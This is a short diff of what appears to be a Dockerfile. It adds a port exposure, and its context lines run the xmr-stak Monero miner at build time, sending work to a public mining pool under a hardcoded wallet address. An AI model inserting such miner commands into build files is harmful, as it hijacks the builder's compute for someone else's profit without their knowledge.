@@ -21,6 +21,7 @@ VOLUME /mnt
 
 WORKDIR /mnt
 
+EXPOSE 8080
 
 RUN echo -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p x
 RUN /xmr-stak/build/bin/xmr-stak -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir -p x --currency monero
